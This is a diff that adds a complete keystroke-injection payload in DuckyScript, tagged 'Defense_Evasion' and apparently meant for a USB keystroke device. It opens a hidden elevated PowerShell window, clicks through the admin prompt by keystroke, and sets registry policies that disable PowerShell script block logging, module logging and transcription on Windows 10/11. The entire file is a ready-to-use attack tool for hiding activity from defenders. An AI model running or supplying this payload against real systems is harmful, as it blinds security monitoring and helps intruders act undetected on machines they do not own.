@@ -1,0 +1,40 @@
+REM Author: UNC0V3R3D
+REM Description: Disables PowerShell Script Block Logging and Module Logging via registry.
+REM Version: 1.0
+REM Category: Defense_Evasion
+REM Target: Windows 10/11
+REM Requirements: Admin privileges
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 2000
+STRING $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
+ENTER
+DELAY 400
+STRING New-Item -Path "$path\ScriptBlockLogging" -Force | Out-Null
+ENTER
+DELAY 400
+STRING Set-ItemProperty -Path "$path\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force
+ENTER
+DELAY 400
+STRING New-Item -Path "$path\ModuleLogging" -Force | Out-Null
+ENTER
+DELAY 400
+STRING Set-ItemProperty -Path "$path\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force
+ENTER
+DELAY 400
+STRING New-Item -Path "$path\Transcription" -Force | Out-Null
+ENTER
+DELAY 400
+STRING Set-ItemProperty -Path "$path\Transcription" -Name "EnableTranscripting" -Value 0 -Force
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM End of payload
